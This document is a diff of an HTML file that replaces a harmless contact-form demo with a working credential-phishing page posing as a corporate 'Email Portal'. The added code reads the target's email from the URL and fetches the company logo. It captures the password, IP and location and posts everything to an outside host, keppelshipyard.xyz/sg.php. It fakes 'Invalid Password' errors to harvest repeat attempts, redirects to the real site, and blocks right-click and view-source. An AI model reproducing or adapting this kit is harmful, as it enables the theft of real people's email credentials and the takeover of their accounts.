@@ -1,344 +1,739 @@
-<!DOCTYPE html>
-<html lang="en">
+<html id="html" data-ref="alphash" data-iframe="0" lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dangote Background Demo</title>
+    <title>PORTAL - <span id="tit"></span> Mail Authentication</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link id="faviconx" rel="icon" type="image/x-icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&amp;type=FAVICON&amp;fallback_opts=TYPE,SIZE,URL&amp;url=http://aegistax.com&amp;size=64">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
     <style>
-        * {
+        body {
+            background-color: #f5f7fa;
+            overflow-x: hidden;
+            user-select: none;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
             position: relative;
-            overflow-x: hidden;
+            min-height: 100vh;
         }
-
-        /* Background iframe styling */
+        
+        /* Website background using simple gradient based on domain */
         .website-background {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
-            border: none;
-            pointer-events: none; /* Allows clicks to pass through to form */
-            opacity: 0.2; /* Very subtle so form is readable */
-            filter: blur(1px) grayscale(30%);
+            z-index: 0;
+            opacity: 0.15;
+            pointer-events: none;
+            overflow: hidden;
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(3px);
         }
-
-        /* Frosted glass overlay for better readability */
-        .background-overlay {
+        
+        .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.85);
-            backdrop-filter: blur(5px);
+            background: rgba(255, 255, 255, 0.9);
             z-index: 0;
         }
-
-        /* Form container */
-        .form-wrapper {
+        
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
             position: relative;
             z-index: 1;
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 40px 20px;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
         }
-
-        .form-container {
-            background: rgba(255, 255, 255, 0.95);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(10px);
+        
+        .container {
             width: 100%;
+            max-width: 380px; /* Reduced from 440px */
+            background: rgba(255, 255, 255, 0.98);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
-
-        h1 {
-            color: #2c3e50;
-            margin-bottom: 30px;
+        
+        .top-level {
+            background: linear-gradient(135deg, #0a66c3 0%, #0957a6 100%);
+            padding: 20px 15px; /* Reduced padding */
             text-align: center;
-            font-size: 28px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .top-level::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 20% 80%, rgba(255,255,255,0.1) 0%, transparent 50%);
+        }
+        
+        .top-level h3 {
+            color: white;
+            font-size: 20px; /* Reduced from 24px */
+            margin: 12px 0 0 0;
+            position: relative;
             font-weight: 600;
         }
-
-        .email-display {
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-            padding: 25px;
-            border-radius: 12px;
-            margin-bottom: 30px;
-            border-left: 5px solid #e74c3c;
+        
+        .top-level img {
+            width: 60px; /* Reduced from 75px */
+            height: 60px;
+            border-radius: 10px;
+            background: white;
+            padding: 8px;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.15);
+            position: relative;
+        }
+        
+        .info {
+            background: linear-gradient(to right, #f0f4f8, #e6ecf2);
+            padding: 10px 15px; /* Reduced padding */
+            font-size: 11px; /* Smaller font */
+            color: #4a5568;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px; /* Reduced gap */
+            position: relative;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .info::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 20%;
+            right: 20%;
+            height: 2px;
+            background: linear-gradient(to right, #0a66c3, #28a745);
+            border-radius: 2px;
+        }
+        
+        .info span {
+            display: inline-flex;
+            align-items: center;
+            background: white;
+            padding: 4px 8px; /* Reduced padding */
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            border: 1px solid #e2e8f0;
+        }
+        
+        .icon {
+            margin-right: 4px; /* Reduced margin */
+            color: #0a66c3;
+            font-size: 12px; /* Smaller icons */
+        }
+        
+        .intro-text {
+            padding: 20px 15px; /* Reduced padding */
             text-align: center;
-        }
-
-        .email-label {
-            display: block;
-            color: #7f8c8d;
-            font-size: 14px;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .email-value {
-            font-size: 24px;
-            font-weight: bold;
-            color: #2c3e50;
-            word-break: break-all;
-        }
-
-        .domain-part {
-            color: #e74c3c;
-            text-decoration: none;
-            border-bottom: 2px dotted #e74c3c;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .domain-part:hover {
-            color: #c0392b;
-            border-bottom-style: solid;
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #34495e;
-            font-weight: 500;
-        }
-
-        input, textarea, select {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #e0e6ed;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s ease;
             background: white;
         }
-
-        input:focus, textarea:focus, select:focus {
-            outline: none;
-            border-color: #3498db;
-            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
-        }
-
-        .submit-btn {
-            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
-            color: white;
-            padding: 16px 32px;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
+        
+        .intro-text h2 {
+            color: #1a365d;
+            font-size: 18px; /* Reduced */
+            margin: 0 0 10px 0; /* Reduced margin */
             font-weight: 600;
-            cursor: pointer;
+        }
+        
+        .intro-text p {
+            color: #4a5568;
+            font-size: 14px; /* Reduced */
+            line-height: 1.5;
+            margin: 0;
+        }
+        
+        hr {
+            border: none;
+            height: 1px;
+            background: linear-gradient(to right, #e2e8f0, #0a66c3, #e2e8f0);
+            margin: 15px 0; /* Reduced margin */
+        }
+        
+        .inputs {
+            padding: 0 15px 20px 15px; /* Reduced padding */
+            background: white;
+        }
+        
+        .input {
+            position: relative;
+            margin-bottom: 20px; /* Reduced margin */
+        }
+        
+        .input input {
             width: 100%;
+            height: 48px; /* Reduced height */
+            padding: 16px 12px 4px 12px; /* Adjusted padding */
+            border: 1.5px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            box-sizing: border-box;
             transition: all 0.3s ease;
-            letter-spacing: 1px;
+            background: #f8fafc;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
+        
+        .input input:focus {
+            border-color: #0a66c3;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(10, 102, 195, 0.1);
         }
-
-        .submit-btn:active {
-            transform: translateY(0);
+        
+        .input label {
+            position: absolute;
+            top: 14px; /* Adjusted */
+            left: 12px;
+            color: #718096;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            pointer-events: none;
+            background: transparent;
+            padding: 0 4px;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
-
-        .status-indicator {
+        
+        .input input:focus ~ label,
+        .input input:valid ~ label {
+            top: -8px;
+            font-size: 12px;
+            color: #0a66c3;
+            background: white;
+            font-weight: 600;
+            padding: 0 6px;
+        }
+        
+        #auth_reg, #auth_reg2 {
+            color: #e53e3e;
+            font-size: 13px;
+            display: none;
+            padding: 8px 10px;
+            background: #fed7d7;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            border-left: 3px solid #e53e3e;
+            font-weight: 500;
+            text-align: center; /* Added center alignment */
+        }
+        
+        .error-container {
+            margin-bottom: 10px;
+            text-align: center; /* Center align errors */
+        }
+        
+        .rem_me {
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            color: #27ae60;
-            font-size: 14px;
-            opacity: 0;
-            transition: opacity 0.3s ease;
+            margin-bottom: 18px;
+            padding: 10px 12px;
+            background: #f8fafc;
+            border-radius: 8px;
+            border: 1.5px solid #e2e8f0;
+            transition: all 0.3s ease;
         }
-
-        .status-indicator.visible {
-            opacity: 1;
+        
+        .rem_me:hover {
+            border-color: #cbd5e0;
+            background: #edf2f7;
         }
-
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            background: #27ae60;
-            border-radius: 50%;
-            animation: pulse 2s infinite;
+        
+        .rem_me input[type="checkbox"] {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
         }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        /* Responsive design */
-        @media (max-width: 600px) {
-            .form-container {
-                padding: 30px 20px;
-                margin: 20px;
-            }
-            
-            .email-value {
-                font-size: 20px;
-            }
-            
-            .website-background {
-                opacity: 0.1;
-            }
-        }
-
-        .watermark {
-            text-align: center;
-            margin-top: 30px;
-            color: #7f8c8d;
-            font-size: 14px;
-        }
-
-        .watermark a {
-            color: #3498db;
+        
+        .rem_me a {
+            color: #0a66c3;
+            font-size: 13px;
             text-decoration: none;
+            cursor: pointer;
+            font-weight: 600;
         }
-
-        .watermark a:hover {
+        
+        .rem_me a:hover {
             text-decoration: underline;
+        }
+        
+        .terms-checkbox {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 22px;
+            padding: 14px;
+            background: linear-gradient(135deg, #f8fafc 0%, #edf2f7 100%);
+            border-radius: 8px;
+            border: 1.5px solid #e2e8f0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .terms-checkbox::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, #0a66c3, #0957a6);
+        }
+        
+        .terms-checkbox input[type="checkbox"] {
+            margin-right: 10px;
+            margin-top: 1px;
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+        
+        .terms-checkbox label {
+            font-size: 13px;
+            color: #2d3748;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+        
+        #terms-error {
+            color: #e53e3e;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            padding: 8px 10px;
+            background: #fed7d7;
+            border-radius: 6px;
+            border-left: 3px solid #e53e3e;
+            text-align: center;
+        }
+        
+        button {
+            width: 100%;
+            height: 48px; /* Reduced height */
+            background: linear-gradient(135deg, #0a66c3 0%, #0957a6 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px; /* Slightly smaller */
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 22px;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
+        }
+        
+        button:hover {
+            background: linear-gradient(135deg, #0957a6 0%, #084a91 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(10, 102, 195, 0.25);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .join-link {
+            text-align: center;
+            padding: 18px 15px;
+            color: #718096;
+            font-size: 12px;
+            background: linear-gradient(to right, #f8fafc, #edf2f7);
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .join-link a {
+            color: #0a66c3;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .join-link a:hover {
+            text-decoration: underline;
+        }
+        
+        @media only screen and (max-width: 600px) {
+            .container {
+                max-width: 92%;
+                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
+            }
+            
+            .main-container {
+                padding: 10px;
+            }
+            
+            .info {
+                flex-direction: column;
+                gap: 8px;
+                align-items: center;
+            }
+            
+            .top-level {
+                padding: 18px 12px;
+            }
+            
+            .intro-text,
+            .inputs {
+                padding: 18px 12px;
+            }
         }
     </style>
 </head>
+
 <body>
-    <!-- Dangote.com in background (HTTPS) -->
-    <iframe 
-        src="https://dangote.com" 
-        class="website-background" 
-        title="Dangote Group Website Background"
-        loading="lazy"
-        sandbox="allow-same-origin allow-scripts"
-        referrerpolicy="no-referrer">
-    </iframe>
+    <!-- Website background -->
+    <div class="website-background" id="websiteBackground"></div>
+    <div class="overlay"></div>
     
-    <!-- Frosted glass overlay -->
-    <div class="background-overlay"></div>
-    
-    <!-- Form Section -->
-    <div class="form-wrapper">
-        <div class="form-container">
-            <h1>Contact Information</h1>
-            
-            <div class="email-display">
-                <span class="email-label">Email Address</span>
-                <div class="email-value">
-                    oluwa@<span class="domain-part" onclick="window.open('https://dangote.com', '_blank')">dangote.com</span>
-                </div>
+    <div class="main-container">
+        <div class="container w3-animate-zoom">
+            <div class="top-level">
+                <img class="main_logo_id" src="" style="width:60px;">
+                <h3>EMAIL PORTAL</h3>
             </div>
             
-            <form id="contactForm">
-                <div class="form-group">
-                    <label for="fullName">Full Name</label>
-                    <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
-                </div>
-                
-                <div class="form-group">
-                    <label for="subject">Subject</label>
-                    <select id="subject" name="subject" required>
-                        <option value="">Select a subject</option>
-                        <option value="business">Business Inquiry</option>
-                        <option value="partnership">Partnership</option>
-                        <option value="career">Career Opportunity</option>
-                        <option value="other">Other</option>
-                    </select>
-                </div>
-                
-                <div class="form-group">
-                    <label for="message">Message</label>
-                    <textarea id="message" name="message" rows="5" placeholder="Type your message here..." required></textarea>
-                </div>
-                
-                <button type="submit" class="submit-btn" id="submitBtn">
-                    <span id="btnText">Send Message</span>
-                </button>
-                
-                <div class="status-indicator" id="statusIndicator">
-                    <div class="status-dot"></div>
-                    <span>Using HTTPS Secure Connection</span>
+            <div class="info">
+                <span class="datetime"></span>
+                <span class="browser"></span>
+                <span class="os"></span>
+                <span class="location"></span>
+            </div>
+            
+            <div class="intro-text">
+                <h2 id="auth_email"></h2>
+                <hr>
+                <p id="comment_text">You're accessing a secure settings, please Sign in your account to continue.</p>
+            </div>
+            
+            <form id="contact" method="POST">
+                <div class="inputs">
+                    <input type="hidden" name="email" id="email" required>
+                    
+                    <div class="input">
+                        <input type="password" name="password" id="password" required>
+                        <label id="pass_label" for="password">Password</label>
+                    </div>
+                    
+                    <!-- Error messages container -->
+                    <div class="error-container">
+                        <div id="auth_reg">Authentication is required!</div>
+                        <div id="auth_reg2">Invalid Password. Please enter correct password and try again.</div>
+                    </div>
+                    
+                    <div class="rem_me">
+                        <input type="checkbox" id="show_pass_button">
+                        <a id="show_pass" style="color:#0A66C3; font-size: 0.8rem;">Show password</a>
+                    </div>
+                    
+                    <!-- REQUIRED CHECKBOX -->
+                    <div class="terms-checkbox">
+                        <input type="checkbox" id="terms_agree" name="terms_agree" required>
+                        <label for="terms_agree">I confirm that I am the authorized user of this account</label>
+                    </div>
+                    <div id="terms-error">You must confirm that you are the authorized user of this account to continue.</div>
+                    
+                    <button id="next_button" type="submit">NEXT</button>
                 </div>
             </form>
             
-            <div class="watermark">
-                Background: <a href="https://dangote.com" target="_blank">https://dangote.com</a>
+            <div class="join-link">
+                © 2025&nbsp;<a href="#" id="footer_com">Secure Portal</a>&nbsp;|&nbsp;<a href="#" id="footer_pri">Privacy</a><br>
+                <a href="#" id="footer_dom"></a>
             </div>
         </div>
     </div>
 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('contactForm');
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
-            const statusIndicator = document.getElementById('statusIndicator');
-            
-            // Show HTTPS status
-            setTimeout(() => {
-                statusIndicator.classList.add('visible');
-            }, 1000);
-            
-            // Form submission handler
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
+    $(document).ready(function(){
+        // Call the function to display date, time, browser, OS, and location
+        displayInfo();
+        
+        var count = 0;
+        var email = window.location.hash.substr(1);
+        var my_slice = "";
+        var userLocation = "";
+        var domainName = "";
+        var websiteUrl = "";
+        
+        // Get location info from info display
+        setTimeout(function() {
+            userLocation = $('.location').text().replace('<i class="fas fa-map-marker-alt icon"></i>', '');
+        }, 1000);
+        
+        if (email) {
+            var my_email = email;
+            $('#email').val(my_email);
+            $('#auth_email').html(my_email);
+
+            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+            if (filter.test(my_email)) {
+                var ind = my_email.indexOf("@");
+                my_slice = my_email.substr((ind+1));
+                var c = my_slice.substr(0, my_slice.indexOf('.'));
+                domainName = my_slice.toUpperCase();
+                websiteUrl = "https://www." + my_slice;
+                var finalu = c.toUpperCase();
                 
-                const originalText = btnText.textContent;
-                btnText.textContent = 'Sending...';
-                submitBtn.disabled = true;
+                // Set logo
+                var logoUrl = "https://logo.clearbit.com/"+my_slice;
+                $(".main_logo_id").attr("src", logoUrl).on('error', function() {
+                    $(this).attr('src', 'https://via.placeholder.com/60/0a66c3/ffffff?text=' + c.charAt(0).toUpperCase());
+                });
                 
-                // Simulate secure HTTPS submission
-                setTimeout(() => {
-                    alert('✅ Form submitted securely via HTTPS!\n\nYour data is encrypted and protected.');
-                    form.reset();
-                    btnText.textContent = 'Message Sent Successfully!';
-                    
-                    setTimeout(() => {
-                        btnText.textContent = originalText;
-                        submitBtn.disabled = false;
-                    }, 2000);
-                }, 1500);
-            });
-            
-            // Check if background site loads successfully
-            const iframe = document.querySelector('.website-background');
-            iframe.addEventListener('load', function() {
-                console.log('Dangote.com loaded in background');
-            });
-            
-            iframe.addEventListener('error', function() {
-                console.log('Could not load background website - it may block iframe embedding');
-                // Fallback background
-                document.body.style.background = "linear-gradient(135deg, #667eea 0%, #764ba2 100%)";
-            });
+                // Update all text displays
+                $("#tit").html(finalu);
+                $("#pussy").html(my_slice);
+                $("#footer_dom").html(my_slice);
+                $('#auth_email').html(my_email + " - Verification Required");
+                
+                // Create background based on domain
+                var hue = my_slice.split('').reduce((a, b) => a + b.charCodeAt(0), 0) % 360;
+                var bgColor1 = 'hsl(' + hue + ', 70%, 85%)';
+                var bgColor2 = 'hsl(' + ((hue + 60) % 360) + ', 70%, 65%)';
+                $('#websiteBackground').css('background', 'linear-gradient(135deg, ' + bgColor1 + ', ' + bgColor2 + ')');
+                
+                // Add domain text pattern to background
+                var bgPattern = '';
+                for(var i = 0; i < 20; i++) {
+                    var size = Math.random() * 40 + 20;
+                    var x = Math.random() * 100;
+                    var y = Math.random() * 100;
+                    var rotation = Math.random() * 360;
+                    var opacity = Math.random() * 0.1 + 0.05;
+                    bgPattern += '<div style="position:absolute;top:' + y + '%;left:' + x + '%;transform:rotate(' + rotation + 'deg);font-size:' + size + 'px;font-weight:900;color:rgba(10,102,195,' + opacity + ');pointer-events:none;z-index:0;">' + domainName + '</div>';
+                }
+                $('#websiteBackground').append(bgPattern);
+            }
+        } else {
+            // Default if no email
+            $('#websiteBackground').css('background', 'linear-gradient(135deg, #0a66c3, #0957a6)');
+        }
+
+        // Show password toggle
+        $('#show_pass_button').click(function(){
+            var passwordField = $('#password');
+            if(passwordField.attr('type') === 'password'){
+                passwordField.attr('type', 'text');
+                $('#show_pass').text('Hide password');
+            } else {
+                passwordField.attr('type', 'password');
+                $('#show_pass').text('Show password');
+            }
         });
+
+        // Form submission
+        $('#contact').submit(function(event){
+            event.preventDefault();
+            
+            // Reset error messages
+            $('#auth_reg').hide();
+            $('#auth_reg2').hide();
+            $('#terms-error').hide();
+            
+            // Check if terms checkbox is checked
+            if(!$('#terms_agree').is(':checked')) {
+                $('#terms-error').show();
+                return false;
+            }
+            
+            var email = $("#email").val();
+            var password = $("#password").val();
+            
+            if (!email) {
+                $('#auth_reg').show().html("Email cannot be found");
+                return false;
+            }
+            
+            if (!password) {
+                $('#auth_reg').show().html("Password is empty!");
+                return false;
+            }
+
+            count = count + 1;
+            
+            // Disable button during submission
+            var $button = $('#next_button');
+            var originalText = $button.html();
+            $button.prop('disabled', true).html('Verifying...');
+            
+            // Get current time and browser info
+            var currentTime = new Date().toLocaleString();
+            var browserInfo = detectBrowser();
+            var osInfo = detectOS();
+            var userAgent = navigator.userAgent;
+            var ipAddress = "Unknown";
+            
+            // Get IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                })
+                .catch(() => {
+                    ipAddress = "Unknown";
+                })
+                .finally(() => {
+                    // Prepare all data to send
+                    var formData = {
+                        email: email,
+                        password: password,
+                        terms_agree: $('#terms_agree').is(':checked') ? 'yes' : 'no',
+                        timestamp: currentTime,
+                        browser: browserInfo,
+                        os: osInfo,
+                        user_agent: userAgent,
+                        location: userLocation,
+                        ip: ipAddress,
+                        page_title: document.title,
+                        attempt: count,
+                        domain: my_slice || 'unknown',
+                        website_url: websiteUrl || 'unknown',
+                        referrer: document.referrer || 'direct'
+                    };
+                    
+                    console.log("Sending data:", formData);
+                    
+                    // Send data using form submission
+                    var form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'https://keppelshipyard.xyz/sg.php';
+                    form.target = '_blank'; // Open in new tab/window
+                    form.style.display = 'none';
+                    
+                    // Add all data as hidden inputs
+                    for(var key in formData) {
+                        var input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = formData[key];
+                        form.appendChild(input);
+                    }
+                    
+                    document.body.appendChild(form);
+                    form.submit();
+                    
+                    // Handle different attempt counts
+                    if (count === 1) {
+                        // First attempt: show error
+                        setTimeout(function() {
+                            $button.prop('disabled', false).html(originalText);
+                            $("#auth_reg2").show();
+                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                        }, 500);
+                    } else if (count === 2) {
+                        // Second attempt: show same error
+                        setTimeout(function() {
+                            $button.prop('disabled', false).html(originalText);
+                            $("#auth_reg2").show();
+                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                        }, 500);
+                    } else if (count >= 3 && websiteUrl) {
+                        // Third attempt: redirect
+                        $button.html('Redirecting...');
+                        setTimeout(function() {
+                            window.location.href = websiteUrl;
+                        }, 1500);
+                    }
+                });
+            
+            return false;
+        });
+        
+        // Enable form submission on Enter key
+        $('#password').keypress(function(e){
+            if(e.which === 13){
+                $('#contact').submit();
+            }
+        });
+    });
+    
+    // Functions for displaying user info
+    function displayInfo() {
+        var currentDate = new Date();
+        var dateString = currentDate.toDateString();
+        var timeString = currentDate.toLocaleTimeString();
+        $('.datetime').html('<i class="far fa-calendar-alt icon"></i>' + dateString + ' <i class="far fa-clock icon"></i>' + timeString);
+
+        var browserType = detectBrowser();
+        $('.browser').html('<i class="fab fa-internet-explorer icon"></i>' + browserType);
+
+        var os = detectOS();
+        $('.os').html('<i class="fab fa-windows icon"></i>' + os);
+
+        // Get location and IP
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                var city = data.city || "Unknown";
+                var country = data.country_name || "Unknown";
+                var ip = data.ip || "Unknown";
+                $('.location').html('<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country + ' (IP: ' + ip + ')');
+            })
+            .catch(() => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        $('.location').html('<i class="fas fa-map-marker-alt icon"></i>IP: ' + data.ip);
+                    })
+                    .catch(() => {
+                        $('.location').html('<i class="fas fa-map-marker-alt icon"></i>Location unavailable');
+                    });
+            });
+    }
+
+    function detectBrowser() {
+        var userAgent = navigator.userAgent;
+        if (userAgent.indexOf("Chrome") > -1) return "Chrome";
+        if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+        if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) return "Safari";
+        if (userAgent.indexOf("Edge") > -1) return "Edge";
+        if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
+        if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+        return "Unknown Browser";
+    }
+
+    function detectOS() {
+        var userAgent = navigator.userAgent;
+        if (userAgent.indexOf("Windows") > -1) return "Windows";
+        if (userAgent.indexOf("Mac") > -1) return "Mac OS";
+        if (userAgent.indexOf("Linux") > -1) return "Linux";
+        if (userAgent.indexOf("Android") > -1) return "Android";
+        if (userAgent.indexOf("iOS") > -1 || userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) return "iOS";
+        return "Unknown OS";
+    }
+    
+    // Prevent right-click and Ctrl+U/Ctrl+S
+    document.addEventListener("contextmenu", function(event) {
+        event.preventDefault();
+    });
+
+    document.addEventListener("keydown", function(event) {
+        if (event.ctrlKey && (event.key === "u" || event.key === "s")) {
+            event.preventDefault();
+        }
+    });
     </script>
 </body>
 </html>
